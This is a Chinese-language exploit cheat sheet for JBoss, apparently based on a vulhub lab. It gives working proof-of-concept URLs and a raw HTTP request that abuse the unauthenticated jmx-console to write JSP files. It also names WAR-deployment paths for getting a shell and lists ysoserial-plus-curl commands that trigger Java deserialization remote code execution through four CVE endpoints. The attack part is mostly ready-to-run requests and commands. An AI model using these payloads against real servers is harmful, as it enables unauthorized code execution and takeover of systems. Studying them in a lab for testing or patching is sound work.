# JBoss

JBoss高危漏洞主要涉及到以下两种。

- 第一种是利用未授权访问进入JBoss后台进行文件上传的漏洞，例如：CVE-2007-1036，CVE-2010-0738,CVE-2006-5750以及void addURL() void deploy() 上传war包。
- 另一种是利用Java反序列化进行远程代码执行的漏洞，例如：CVE-2015-7501，CVE-2017-7504，CVE-2017-12149，CVE-2013-4810。

## 访问控制不严导致的漏洞

CVE-2007-1036，CVE-2010-0738,CVE-2006-5750
CVE-2007-1036，CVE-2010-0738,CVE-2006-5750 都是利用的一个地方，CVE-2006-5750，CVE-2007-1036是这个地址的两种不同访问方式导致两种未授权访问漏洞，CVE-2010-0738是CVE-2007-1036的绕过。

漏洞页面如下：

http://192.168.10.128:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFi

CVE-2007-1036

poc如下，会生成 http://192.168.10.128:8080/b/b.jsp页面，页面内容是 test

http://192.168.10.128:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=5&arg0=b.war&arg1=b&arg2=.jsp&arg3=%3C%25out.println%28%22test%22%29%3B%25%3E&arg4=True



CVE-2006-5750

poc如下，会生成http://192.168.10.128:8080/b/b.jsp页面，页面内容是 test

http://192.168.64.129:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=c.war&argType=java.lang.String&arg1=c&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3C%25out.println%28%22test%22%29%3B%25%3E&argType=boolean&arg4=True



CVE-2007-1036

数据包如下，会http://192.168.10.128:8080/b/b.jsp页面，页面内容是test，注意是HEAD请求

HEAD /jmx-console/HtmlAdaptor?

action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=5&arg0=a.war&arg1=

a&arg2=.jsp&arg3=%3C%25out.println%28%22test%22%29%3B%25%3E&arg4=True HTTP/1.1

Host: 192.168.10.128:8080

Cache-Control: max-age=0

Authorization: Basic YWRtaW46YWRtaW4=

Upgrade-Insecure-Requests: 1

Origin: http://192.168.10.128:8080

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 

Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://192.168.10.128:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

Cookie: JSESSIONID=EB1FF2DBD5FAE956570012622CA45C8D

Connection: close



void addURL() void deploy()远程上传war包getshell

这两种都是利用的整个后台的未授权访问，或者弱口令登录后台，然后部署war包，进而getshell



void addURL()

远程上传war访问地址

http://192.168.10.128:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployment%3Atype%3DDeplo

void deploy()

远程上传war包访问地址：

```url
http://192.168.10.128:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDepl
```

## 反序列化导致的漏洞

之前爆出来的反序列化漏洞主要有 CVE-2017-7504 CVE-2013-4810 CVE-2015-7501 CVE-2017-12149，但其实利用方式完全一致，都是因为某个接口接收序列化数据后会进行反序列化进而触发反序列化漏洞。

所以这些漏洞payload可以共用一个，只是请求的路径不一样。（网上给出的影响范围并不靠谱，使用vulhub的CVE-2017-7504测试环境，jboss版本为4.0.5，以下四个漏洞全部测试成功，所以并不能单纯靠看版本号来确定是不是存在漏洞）

> 生成payload
>
> java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" > 1.ser
>
> CVE-2017-7504
>
> curl http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser
>
> CVE-2013-4810
>
> curl http://your-ip:8080/invoker/EJBInvokerServlet --data-binary @1.ser
>
> CVE-2015-7501
>
> curl http://your-ip:8080/invoker/JMXInvokerServlet --data-binary @1.ser
>
> CVE-2017-12149
>
> curl http://your-ip:8080/invoker/readonly --data-binary @1.ser